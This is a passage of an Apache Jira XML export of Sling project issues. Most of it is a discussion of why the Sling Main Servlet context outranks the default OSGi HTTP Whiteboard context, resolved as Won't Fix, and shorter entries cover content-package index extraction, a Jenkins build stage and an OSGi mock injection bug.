                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 48 weeks, 5 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1ccc0:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11677] Sling Engine Context &apos;org.apache.sling&apos; has higher ranking than &apos;default&apos; context</title>
                <link>https://issues.apache.org/jira/browse/SLING-11677</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;When a servlet is registered with the OSGi HTTP Whiteboard pattern without the property &lt;tt&gt;osgi.http.whiteboard.context.select&lt;/tt&gt; the &quot;default&quot; context helper is used (&lt;a href=&quot;https://docs.osgi.org/specification/osgi.cmpn/7.0.0/service.http.whiteboard.html#service.http.whiteboard.common.properties&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://docs.osgi.org/specification/osgi.cmpn/7.0.0/service.http.whiteboard.html#service.http.whiteboard.common.properties&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;With the Jetty Implementation from Felix in Sling this has the &lt;tt&gt;service.ranking&lt;/tt&gt; &lt;tt&gt;Integer.MIN_VALUE&lt;/tt&gt; (&lt;a href=&quot;https://github.com/apache/felix-dev/blob/e7d17aca517949dd65a913f9ac5088e653a4a2dc/http/base/src/main/java/org/apache/felix/http/base/internal/whiteboard/WhiteboardManager.java#L182&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/felix-dev/blob/e7d17aca517949dd65a913f9ac5088e653a4a2dc/http/base/src/main/java/org/apache/felix/http/base/internal/whiteboard/WhiteboardManager.java#L182&lt;/a&gt;) while the one for the default Sling Main Servlet has no explicit ranking (i.e. 0). That leads to the fact that the Sling Main servlet always takes precedence as&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;In the case of two Servlet Context Helpers with the same path, the service with the highest ranking is searched first for a match. In the case of a tie, the lowest service ID is searched first.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;(&lt;a href=&quot;https://docs.osgi.org/specification/osgi.cmpn/7.0.0/service.http.whiteboard.html#service.http.whiteboard.servletcontext&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://docs.osgi.org/specification/osgi.cmpn/7.0.0/service.http.whiteboard.html#service.http.whiteboard.servletcontext&lt;/a&gt;) as both &quot;default&quot; and &quot;org.apache.sling&quot; are registered for path &quot;&amp;lt;root&amp;gt;&quot;.&lt;/p&gt;

&lt;p&gt;The Sling Main servlet context should use a lower ranking so that simple servlets registered via OSGI HTTP Whiteboard pattern without explicit context can kick in at all!&lt;/p&gt;

&lt;p&gt;Attached the web console of Sling Starter 12:&lt;/p&gt;

&lt;p&gt; &lt;span class=&quot;image-wrap&quot; style=&quot;&quot;&gt;&lt;img src=&quot;https://issues.apache.org/jira/secure/attachment/13052220/13052220_Servlet-Contexts.png&quot; style=&quot;border: 0px solid black&quot; /&gt;&lt;/span&gt; &lt;/p&gt;</description>
                <environment></environment>
        <key id="13502714">SLING-11677</key>
            <summary>Sling Engine Context &apos;org.apache.sling&apos; has higher ranking than &apos;default&apos; context</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="5" iconUrl="https://issues.apache.org/jira/images/icons/statuses/resolved.png" description="A resolution has been taken, and it is awaiting verification by reporter. From here issues are either reopened, or are closed.">Resolved</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="2">Won&apos;t Fix</resolution>
                                        <assignee username="kwin">Konrad Windszus</assignee>
                                    <reporter username="kwin">Konrad Windszus</reporter>
                        <labels>
                    </labels>
                <created>Tue, 15 Nov 2022 15:11:08 +0000</created>
                <updated>Wed, 12 Apr 2023 07:01:42 +0000</updated>
                            <resolved>Wed, 12 Apr 2023 06:48:03 +0000</resolved>
                                                                    <component>Engine</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>3</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="1200">20m</timespent>
                                <comments>
                            <comment id="17634402" author="kwin" created="Tue, 15 Nov 2022 15:14:27 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=cziegeler&quot; class=&quot;user-hover&quot; rel=&quot;cziegeler&quot;&gt;cziegeler&lt;/a&gt; Do you know how to give the &quot;default&quot; servlet context a higher ranking? Doesn&apos;t seem to be configurable via Metatype...&lt;/p&gt;</comment>
                            <comment id="17634410" author="cziegeler" created="Tue, 15 Nov 2022 15:21:26 +0000"  >&lt;p&gt;I don&apos;t recall the details, but I think there is a good reason why the default has this service ranking. In any case, the best is to use a separate servlet context helper and not rely on the default.&lt;/p&gt;</comment>
                            <comment id="17634411" author="kwin" created="Tue, 15 Nov 2022 15:23:09 +0000"  >&lt;blockquote&gt;&lt;p&gt;In any case, the best is to use a separate servlet context helper and not rely on the default.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;Why? This is not necessary for simple servlets and IMHO just unnecessary overhead. Also the Felix HTTP Whiteboard actually took precedence, so with migration you easily run into that issue (in my case &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-11676&quot; title=&quot;Tooling Support Source should migrate from Felix HTTP Whiteboard to OSGi HTTP Whiteboard&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-11676&quot;&gt;&lt;del&gt;SLING-11676&lt;/del&gt;&lt;/a&gt;).&lt;/p&gt;</comment>
                            <comment id="17634414" author="cziegeler" created="Tue, 15 Nov 2022 15:44:09 +0000"  >&lt;p&gt;I guess you can just give the Sling context a ranking of MIN_VALUE and have the same effect?&lt;/p&gt;</comment>
                            <comment id="17634418" author="kwin" created="Tue, 15 Nov 2022 15:56:39 +0000"  >&lt;p&gt;FTR: The default context created by the Http Service OTOH has a default ranking of &quot;0&quot; (&lt;a href=&quot;https://docs.osgi.org/specification/osgi.cmpn/7.0.0/service.http.html#d0e7040&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://docs.osgi.org/specification/osgi.cmpn/7.0.0/service.http.html#d0e7040&lt;/a&gt;), that leads me to believe that the service ranking of &quot;default&quot; of HTTP Whiteboard Service is just plain wrong. &lt;span class=&quot;image-wrap&quot; style=&quot;&quot;&gt;&lt;img src=&quot;https://issues.apache.org/jira/secure/attachment/13052221/13052221_HTTP-Service-Default-Context.png&quot; style=&quot;border: 0px solid black&quot; /&gt;&lt;/span&gt; &lt;/p&gt;

&lt;p&gt;Therefore as workaround one can use&lt;/p&gt;

&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
....
@HttpWhiteboardContextSelect(&lt;span class=&quot;code-quote&quot;&gt;&quot;(&quot;&lt;/span&gt; + HttpWhiteboardConstants.HTTP_WHITEBOARD_CONTEXT_NAME + &lt;span class=&quot;code-quote&quot;&gt;&quot;=org.osgi.service.http)&quot;&lt;/span&gt;)
&lt;span class=&quot;code-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;code-keyword&quot;&gt;class &lt;/span&gt;MyServlet &lt;span class=&quot;code-keyword&quot;&gt;extends&lt;/span&gt; HttpServlet {
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Not sure how compatible that is with other HTTP Service implementation as the name &quot;org.osgi.service.http&quot; is nowhere mentioned in the OSGi specs.&lt;/p&gt;</comment>
                            <comment id="17634453" author="kwin" created="Tue, 15 Nov 2022 17:22:23 +0000"  >&lt;p&gt;I opened &lt;a href=&quot;https://github.com/osgi/osgi/issues/511&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/osgi/osgi/issues/511&lt;/a&gt; to get clarification on the default ranking of the default ServletContextHelper. &lt;/p&gt;</comment>
                            <comment id="17636729" author="kwin" created="Mon, 21 Nov 2022 15:11:35 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=rombert&quot; class=&quot;user-hover&quot; rel=&quot;rombert&quot;&gt;rombert&lt;/a&gt; I see you reported basically the same issue in &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-5931&quot; title=&quot;Unable to register a servlet using the R6 Http Service Whiteboard&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-5931&quot;&gt;&lt;del&gt;SLING-5931&lt;/del&gt;&lt;/a&gt;. Why did you end up with the workaround of binding to an existing context? What do you think about the proposed &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-engine/pull/28?&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-engine/pull/28?&lt;/a&gt;&lt;/p&gt;</comment>
                            <comment id="17636741" author="cziegeler" created="Mon, 21 Nov 2022 15:44:36 +0000"  >&lt;p&gt;I think it is not Sling&apos;s concern to handle this case. If an application deployer wants to add additional servlets in the default context next to Sling, than this is where the configuration needs to take place.&lt;br/&gt;
The implementation in Apache Felix might actually change in the future and not register the default context as a service anymore - in which case this workaround here will not work.&lt;/p&gt;</comment>
                            <comment id="17637107" author="cziegeler" created="Tue, 22 Nov 2022 09:21:43 +0000"  >&lt;p&gt;For the record, the upcoming Apache Felix implementation will no longer register the default context as an OSGi service (see &lt;a href=&quot;https://issues.apache.org/jira/browse/FELIX-6584&quot; title=&quot;Avoid registering default servlet context as service&quot; class=&quot;issue-link&quot; data-issue-key=&quot;FELIX-6584&quot;&gt;&lt;del&gt;FELIX-6584&lt;/del&gt;&lt;/a&gt;)&lt;/p&gt;</comment>
                            <comment id="17637117" author="kwin" created="Tue, 22 Nov 2022 09:42:43 +0000"  >&lt;p&gt;What about registering a context service with name &quot;default&quot; with a higher service rank then? The goal should IMHO still be that servlets using the default context should rank higher than Sling Main Servlet.&lt;/p&gt;</comment>
                            <comment id="17637124" author="cziegeler" created="Tue, 22 Nov 2022 09:53:02 +0000"  >&lt;p&gt;Why should Sling do this? What if another bundle installed already a default context - how do you avoid clashes? I think this goes beyond the scope of Sling to sort out&lt;/p&gt;</comment>
                            <comment id="17637127" author="kwin" created="Tue, 22 Nov 2022 09:55:35 +0000"  >&lt;blockquote&gt;&lt;p&gt;Why should Sling do this? &lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;Because Sling registers the Main servlet in a way which makes the default context no longer usable.&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;What if another bundle installed already a default context - how do you avoid clashes?&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;I would register it only conditionally if no such service exists yet otherwise just emit a WARN in case the default ranks lower.&lt;/p&gt;</comment>
                            <comment id="17637157" author="rombert" created="Tue, 22 Nov 2022 10:42:23 +0000"  >&lt;blockquote&gt;&lt;p&gt; I see you reported basically the same issue in &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-5931&quot; title=&quot;Unable to register a servlet using the R6 Http Service Whiteboard&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-5931&quot;&gt;&lt;del&gt;SLING-5931&lt;/del&gt;&lt;/a&gt;. Why did you end up with the workaround of binding to an existing context? What do you think about the proposed &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-engine/pull/28?&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-engine/pull/28?&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=kwin&quot; class=&quot;user-hover&quot; rel=&quot;kwin&quot;&gt;kwin&lt;/a&gt; - I basically poked it until it worked, I did not have a good reason for the specific choice back then.&lt;/p&gt;</comment>
                            <comment id="17637186" author="cziegeler" created="Tue, 22 Nov 2022 11:17:22 +0000"  >&lt;p&gt;Sling does not know what else is deployed, guessing does not make sense. For example, the Sling context might be configured to a different path than the root, or the other default context might appear later than then Sling engine etc. There are so many different ways to configure the system, that we should not go into this territory. We can clearly document what you need to do if you use the default setup.&lt;/p&gt;</comment>
                            <comment id="17711195" author="cziegeler" created="Wed, 12 Apr 2023 05:27:28 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=kwin&quot; class=&quot;user-hover&quot; rel=&quot;kwin&quot;&gt;kwin&lt;/a&gt;&#160; with FELIX&#8211;6584 released some time ago, can we close this?&lt;/p&gt;</comment>
                            <comment id="17711217" author="kwin" created="Wed, 12 Apr 2023 06:47:55 +0000"  >&lt;p&gt;With &lt;a href=&quot;https://issues.apache.org/jira/browse/FELIX-6584&quot; class=&quot;external-link&quot; rel=&quot;nofollow&quot;&gt;https://issues.apache.org/jira/browse/FELIX-6584&lt;/a&gt; implemented it is no longer possible to leverage the default context in any servlets used in a Sling distribution. Therefore closing this as Won&apos;t fix. I am gonna extend &lt;a href=&quot;https://sling.apache.org/documentation/the-sling-engine/servlets.html&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://sling.apache.org/documentation/the-sling-engine/servlets.html&lt;/a&gt; to mention how OSGi HTTP Whiteboard can be used in OSGi runtimes where the Sling Main Servlet is deployed as well (&lt;a href=&quot;https://github.com/apache/sling-site/pull/108/files&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-site/pull/108/files&lt;/a&gt;).&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="10030">
                    <name>Reference</name>
                                            <outwardlinks description="relates to">
                                        <issuelink>
            <issuekey id="13504966">FELIX-6584</issuekey>
        </issuelink>
            <issuelink>
            <issuekey id="13501139">SLING-11672</issuekey>
        </issuelink>
            <issuelink>
            <issuekey id="13502683">SLING-11676</issuekey>
        </issuelink>
                            </outwardlinks>
                                                                <inwardlinks description="is related to">
                                        <issuelink>
            <issuekey id="12993935">SLING-5931</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                    </issuelinks>
                <attachments>
                            <attachment id="13052221" name="HTTP-Service-Default-Context.png" size="185728" author="kwin" created="Tue, 15 Nov 2022 15:59:38 +0000"/>
                            <attachment id="13052220" name="Servlet-Contexts.png" size="184852" author="kwin" created="Tue, 15 Nov 2022 15:13:27 +0000"/>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>2.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 28 weeks, 1 day ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1c6eg:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11675] Index definition extraction from content packages is missing non-XML files</title>
                <link>https://issues.apache.org/jira/browse/SLING-11675</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;Index definitions can reference non-xml files, such as &quot;stop.txt&quot; for a list of stopwords.&lt;/p&gt;

&lt;p&gt;Currently we do not include these in the cp2fm converter.&#160;&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;We need to modify the code to include everything except blacklisted files such as .vlt .&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;</description>
                <environment></environment>
        <key id="13502135">SLING-11675</key>
            <summary>Index definition extraction from content packages is missing non-XML files</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="Sc0rpic0m">Niek Raaijmakers</assignee>
                                    <reporter username="Sc0rpic0m">Niek Raaijmakers</reporter>
                        <labels>
                    </labels>
                <created>Mon, 14 Nov 2022 10:23:57 +0000</created>
                <updated>Tue, 29 Nov 2022 06:39:16 +0000</updated>
                            <resolved>Tue, 15 Nov 2022 16:26:02 +0000</resolved>
                                                    <fixVersion>Content-Package to Feature Model Converter 1.1.24</fixVersion>
                                    <component>Content-Package to Feature Model Converter</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                <comments>
                            <comment id="17634435" author="rombert" created="Tue, 15 Nov 2022 16:26:02 +0000"  >&lt;p&gt;PR merged, thanks for the contribution &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=Sc0rpic0m&quot; class=&quot;user-hover&quot; rel=&quot;Sc0rpic0m&quot;&gt;Sc0rpic0m&lt;/a&gt;!&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 49 weeks, 1 day ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1c2u0:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11673] Jenkins sanity check stage executed even when no parallel builds are triggered</title>
                <link>https://issues.apache.org/jira/browse/SLING-11673</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-resourceresolver/pull/87&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-resourceresolver/pull/87&lt;/a&gt; shows a &apos;Sanity Check&apos; step, but the build only runs once, with Java 8.&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;image-wrap&quot; style=&quot;&quot;&gt;&lt;img src=&quot;https://issues.apache.org/jira/secure/attachment/13052120/13052120_image-2022-11-11-17-37-54-747.png&quot; style=&quot;border: 0px solid black&quot; /&gt;&lt;/span&gt;&lt;/p&gt;</description>
                <environment></environment>
        <key id="13501151">SLING-11673</key>
            <summary>Jenkins sanity check stage executed even when no parallel builds are triggered</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="4" iconUrl="https://issues.apache.org/jira/images/icons/priorities/minor.svg">Minor</priority>
                        <status id="1" iconUrl="https://issues.apache.org/jira/images/icons/statuses/open.png" description="The issue is open and ready for the assignee to start work on it.">Open</status>
                    <statusCategory id="2" key="new" colorName="blue-gray"/>
                                    <resolution id="-1">Unresolved</resolution>
                                        <assignee username="-1">Unassigned</assignee>
                                    <reporter username="rombert">Robert Munteanu</reporter>
                        <labels>
                    </labels>
                <created>Fri, 11 Nov 2022 16:38:09 +0000</created>
                <updated>Wed, 21 May 2025 13:10:02 +0000</updated>
                                                                            <component>Build and Source Control</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="1200">20m</timespent>
                                        <attachments>
                            <attachment id="13052120" name="image-2022-11-11-17-37-54-747.png" size="81331" author="rombert" created="Fri, 11 Nov 2022 16:37:54 +0000"/>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>1.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 49 weeks, 5 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1bwrk:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11670] org.apache.sling.testing.mock.osgi.OsgiServiceUtil#getMatchingDynamicReferences doesn&apos;t inject references into Components</title>
                <link>https://issues.apache.org/jira/browse/SLING-11670</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;When working with &lt;tt&gt;Components&lt;/tt&gt; that are not registered as services the &lt;tt&gt;org.apache.sling.testing.mock.osgi.OsgiServiceUtil#getMatchingDynamicReferences&lt;/tt&gt; method doesn&apos;t inject references into components when an optional dependency gets installed into the framework.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13500925">SLING-11670</key>
            <summary>org.apache.sling.testing.mock.osgi.OsgiServiceUtil#getMatchingDynamicReferences doesn&apos;t inject references into Components</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="1" iconUrl="https://issues.apache.org/jira/images/icons/statuses/open.png" description="The issue is open and ready for the assignee to start work on it.">Open</status>
                    <statusCategory id="2" key="new" colorName="blue-gray"/>
                                    <resolution id="-1">Unresolved</resolution>
                                        <assignee username="-1">Unassigned</assignee>
                                    <reporter username="radu">Radu Cotescu</reporter>
                        <labels>
                    </labels>
                <created>Thu, 10 Nov 2022 15:38:16 +0000</created>
                <updated>Thu, 10 Nov 2022 15:38:16 +0000</updated>
                                            <version>Testing OSGi Mock 3.3.2</version>
                                                    <component>Testing</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                        <attachments>
